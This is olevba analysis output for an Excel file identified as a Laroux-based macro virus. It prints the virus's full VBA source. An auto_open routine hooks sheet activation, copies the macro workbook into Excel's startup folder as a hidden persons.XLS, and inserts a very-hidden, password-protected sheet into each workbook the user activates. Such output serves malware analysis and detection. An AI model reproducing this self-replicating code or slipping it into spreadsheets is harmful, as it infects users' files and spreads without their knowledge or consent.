olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-c6318012cd96c0884a018fa64eee45704b0e80b7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO persons.bas 
in file: Virus.MSExcel.Laroux-based-c6318012cd96c0884a018fa64eee45704b0e80b7 - OLE stream: '_VBA_PROJECT_CUR/VBA/persons'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "inflecting"
End Sub

Sub inflecting()
Attribute inflecting.VB_ProcData.VB_Invoke_Func = " \n14"
    strtpth = Application.StartupPath
    ifexist = Dir(strtpth & "\" & "persons.XLS")
    If ifexist = "persons.XLS" Then ext = 1 Else ext = 0
    If ActiveWorkbook.Modules.Count > 0 Then modnum = 1 Else modnum = 0
    whichfile = ext + modnum * 10
    If ActiveWorkbook.Name = "persons.xls" Then
    ActiveWorkbook.Visible = xlveryhide
   Else
    End If
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    actbok = ActiveWorkbook.Name
    Sheets("persons").Visible = True
    Sheets("persons").Select
  '  Sheets("persons").Copy
  '  With ActiveWorkbook
  '      .Title = ""
  '      .Subject = ""
  '      .Author = ""
  '      .Keywords = ""
  '      .Comments = ""
  '  End With
    newname = ActiveWorkbook.Name
    CurDire = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = xlveryhide
    Workbooks(newname).SaveAs FileName:=Application.StartupPath & "/" & "persons.XLS", FileFormat:=xlNormal _
        , password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    Workbooks("persons.xls").Close
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "persons.XLS!inflecting"
    Case 1
    Application.ScreenUpdating = False
    actbok = ActiveWorkbook.Name
    ACTBOKPTH = ActiveWorkbook.Path
    firshtnm = Workbooks(actbok).Sheets(1).Name
    If firshtnm <> "persons" Then
        Workbooks("persons.XLS").Sheets("persons").Copy before:=Workbooks(actbok).Sheets(1)
        Workbooks(actbok).Sheets("persons").Visible = xlveryhide
        Sheets("persons").Protect password:="xls"
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "persons.XLS!inflecting"
    Case Else
End Select
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  person
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

